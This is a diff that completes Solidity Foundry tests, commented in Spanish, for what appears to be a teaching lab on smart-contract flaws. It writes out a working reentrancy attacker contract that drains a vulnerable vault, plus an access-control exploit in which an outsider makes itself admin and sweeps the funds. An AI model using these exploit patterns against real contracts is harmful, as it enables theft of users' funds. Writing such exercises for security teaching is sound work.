@@ -20,22 +20,31 @@ import "../src/VaultVulnerable.sol";
 // ---------------------------------------------------------------------------
 contract ReentrancyAttacker {
     VaultVulnerable public vault;
+    uint256 public stake;      // lo que saca cada vuelta: su saldo en el libro
+    uint256 public reentradas; // cuantas veces volvio a entrar (para leer el trace)
 
     constructor(VaultVulnerable _vault) {
         vault = _vault;
     }
 
-    // TODO: el ataque. Recibe ETH del que lo lanza (msg.value), lo deposita en
-    // el vault y dispara el robo.
-    // Ojo: para poder parar a tiempo en receive(), tal vez te sirva 
-    // guardarte cuánto le estás sacando al vault en cada reentrada.
+    // Deposita `msg.value` y retira. `withdraw()` manda el ETH ANTES de poner
+    // el saldo en 0, asi que cada `receive()` ve todavia `balances[this] == stake`
+    // y puede volver a retirar lo mismo.
     function attack() external payable {
+        stake = msg.value;
+        reentradas = 0;
+        vault.deposit{value: msg.value}();
+        vault.withdraw();
     }
 
-    // TODO: se ejecuta cada vez que el vault le envia ETH.
-    // Ojo con cuando parar: si la ultima llamada al vault revierte, el revert se
-    // propaga hacia arriba y deshace todo el ataque.
+    // Se ejecuta cada vez que el vault le manda ETH. Vuelve a entrar mientras al
+    // vault le quede al menos `stake`: si entrara con menos, el `call` del vault
+    // fallaria, revertiria con TransferFailed y se desharia TODO el ataque.
     receive() external payable {
+        if (address(vault).balance >= stake) {
+            reentradas++;
+            vault.withdraw();
+        }
     }
 }
 
@@ -72,6 +81,17 @@ contract VaultVulnerableReentrancyTest is Test {
         attacker.attack{value: 1 ether}(); // invierte 1 ETH
         assertEq(address(vault).balance, 0); // vault vacío
         assertEq(address(attacker).balance, 11 ether); // 1 propio + 10 robados
+        assertEq(attacker.reentradas(), 10);           // 1 withdraw + 10 anidados
+
+        // El libro contable no se entera: sigue debiendo 10 ETH que ya no tiene.
+        assertEq(vault.balanceOf(victima1), 5 ether);
+        assertEq(vault.balanceOf(victima2), 5 ether);
+        assertEq(vault.balanceOf(address(attacker)), 0);
+
+        // Y las victimas ya no pueden retirar: el vault no tiene con que pagar.
+        vm.prank(victima1);
+        vm.expectRevert(VaultVulnerable.TransferFailed.selector);
+        vault.withdraw();
     }
 }
 
@@ -96,7 +116,21 @@ contract VaultVulnerableAccessControlTest is Test {
     // los 8 ETH de la victima. Sin contrato atacante: alcanza con llamadas
     // desde su cuenta (`vm.prank`).
     function test_AccessControl_ExtranioSeQuedaConLosFondos() public {
-        vm.skip(true);   // borrar cuando lo escribas
+        assertEq(vault.admin(), deployer);
+        assertEq(atacante.balance, 0);
+
+        // `setAdmin` no tiene control de acceso: cualquiera se nombra admin...
+        vm.prank(atacante);
+        vault.setAdmin(atacante);
+        assertEq(vault.admin(), atacante);
+
+        // ...y `sweep` le manda todo el ETH del contrato al admin.
+        vm.prank(atacante);
+        vault.sweep();
+
+        assertEq(atacante.balance, 8 ether);
+        assertEq(address(vault).balance, 0);
+        assertEq(vault.balanceOf(victima), 8 ether);   // el libro le sigue debiendo
     }
 }
 
